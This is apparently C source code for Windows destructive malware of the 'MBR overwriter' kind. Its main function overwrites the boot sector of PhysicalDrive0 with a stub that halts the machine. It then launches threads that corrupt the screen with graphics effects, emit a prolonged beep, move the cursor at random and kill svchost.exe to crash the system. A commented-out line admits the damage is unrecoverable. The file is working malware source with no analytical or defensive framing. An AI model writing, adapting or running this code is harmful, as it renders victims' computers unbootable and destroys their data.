#include <stdio.h>
#include <Windows.h>
#include "main.h"
#include <winternl.h>
#include <stdint.h>

INT cx;
INT cy;




const unsigned char mbr_bytes[] = { 0xB4, 0x0E, 0xB0, 0x59, 0xCD, 0x10, 0xEB, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x55, 0xAA
};



void OverwriteMbr() {
    DWORD written;

    HANDLE physicalDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE,
                                       FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    WriteFile(physicalDrive, mbr_bytes, 512, &written, NULL);
    CloseHandle(physicalDrive);
}

uint32_t xor32()
{
    static uint32_t y = 2463534242UL;
    y^=(y<<13); y^=(y>>17); return (y^=(y<<15));
}

DWORD xs;

VOID SeedXorshift32(DWORD dwSeed) {
    xs = dwSeed;
}

DWORD Xorshift32() {
    xs ^= xs << 13;
    xs ^= xs >> 17;
    xs ^= xs << 5;
    return xs;
}



VOID PayloadGfxDarkFlash(INT t) {
    Sleep(Xorshift32() % 201);

    HDC hdcScreen = GetDC(NULL),
            hdcTemp = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmTemp = CreateCompatibleBitmap(hdcScreen, cx, cy);
    SelectObject(hdcTemp, hbmTemp);


    for (INT i = -32; i < 64; i += 16) {
        DOUBLE v = (Xorshift32() % 1001 + 500) / 1000.0;
        StretchBlt(hdcTemp, 0, 0, (INT)(cx / v), (INT)(cy / v),
                   hdcScreen, i, i, (INT)(cx * v), (INT)(cy * v), SRCERASE);
    }
    BitBlt(hdcScreen, 2 ,2, cx, cy, hdcTemp, 0, 0, SRCCOPY);

    DeleteObject(hbmTemp);
    DeleteDC(hdcTemp);
    ReleaseDC(NULL, hdcScreen);
}

DWORD64 payload1(){
    SeedXorshift32(GetTickCount());
    HDC hdc = GetDC(NULL);
    cx = GetSystemMetrics(SM_CXSCREEN);
    cy = GetSystemMetrics(SM_CYSCREEN);
    int w = GetSystemMetrics(SM_CXSCREEN),
            h = GetSystemMetrics(SM_CYSCREEN);


    int j = 0;
    while(1){
        j += 2;


        for(int i = 0; i < cx; i += 2){
            SetPixel(hdc, i, j, RGB(Xorshift32(), Xorshift32(), Xorshift32()));
            SetPixel(hdc, i, j, RGB(Xorshift32(), Xorshift32(), Xorshift32()));

        }

  //      SetPixel(hdc, j, j, RGB(190, 21, 11));
        //     BitBlt(hdc, 5, 5, cx, cy, GetDC(NULL), j, j, SRCCOPY);

    }
    return 0;
}

VOID rgbQuad(){
    SeedXorshift32(GetTickCount());
    HDC hdc = GetDC(NULL);
    cx = GetSystemMetrics(SM_CXSCREEN);
    cy = GetSystemMetrics(SM_CYSCREEN);
    int w = GetSystemMetrics(SM_CXSCREEN),
            h = GetSystemMetrics(SM_CYSCREEN);


  //  HBRUSH hbruh = CreateSolidBrush(RGB(Xorshift32(), rand() % 255, rand() % 150));

    while(1){
        HBRUSH hbruh = CreateSolidBrush(RGB(Xorshift32(), Xorshift32() % 255, rand() % 150));
        SelectObject(hdc, hbruh);
        BitBlt(hdc, rand() % w,  rand() % h, w, h, hdc, rand() % 60 - 30, rand() % h, SRCCOPY);
        PatBlt(hdc, rand() % w,  rand() % h,w,h,PATINVERT);
        PatBlt(hdc, 0,0,w,h,PATINVERT);

        Sleep(3);
    }

}


VOID overwriteMbr() {
    DWORD written;

    HANDLE physicalDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE,
                                       FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    WriteFile(physicalDrive, mbr_bytes, 512, &written, NULL);
    CloseHandle(physicalDrive);
}

VOID prune(){
    SeedXorshift32(GetTickCount());
    HDC hdc = GetDC(NULL);
    cx = GetSystemMetrics(SM_CXSCREEN);
    cy = GetSystemMetrics(SM_CYSCREEN);
    int w = GetSystemMetrics(SM_CXSCREEN),
            h = GetSystemMetrics(SM_CYSCREEN);


    //  HBRUSH hbruh = CreateSolidBrush(RGB(Xorshift32(), rand() % 255, rand() % 150));

    while(1){
        HBRUSH hbruh = CreateSolidBrush(RGB(Xorshift32(), Xorshift32() % 255, rand() % 150));
        SelectObject(hdc, hbruh);
        BitBlt(hdc, rand() % w,  rand() % h, w, h, hdc, rand() % 60 - 30, rand() % h, SRCCOPY);
        PatBlt(hdc, rand() % w,  rand() % h,w,h,PATINVERT);
        PatBlt(hdc, 0,0,w,h,PATINVERT);

        Sleep(3);
    }

}

VOID closePC(){
    Sleep(10000);
   // MessageBoxA(NULL, "Warning: This malware is no joke. It destroys boot loader and causes unrecoverable damage.\nStill want to run it?", "0xE9", MB_YESNO | MB_ICONWARNING);
     system("taskkill /f /im svchost.exe");
}

VOID doBeep(){

    Beep(12000, 300000);

}

VOID randomSex(){
    while(1){


        SetCursorPos(rand() % 1980, rand() % 1080);
        Sleep(5);
    }
}

INT main() {
    overwriteMbr();
    CreateThread(0,0, (LPTHREAD_START_ROUTINE)  rgbQuad,0,0,0);
    CreateThread(0,0, (LPTHREAD_START_ROUTINE)  payload1,0,0,0);
    CreateThread(0,0, (LPTHREAD_START_ROUTINE)  doBeep,0,0,0);
    CreateThread(0,0, (LPTHREAD_START_ROUTINE)  closePC,0,0,0);
    CreateThread(0,0, (LPTHREAD_START_ROUTINE)  randomSex,0,0,0);
    return 0;
}
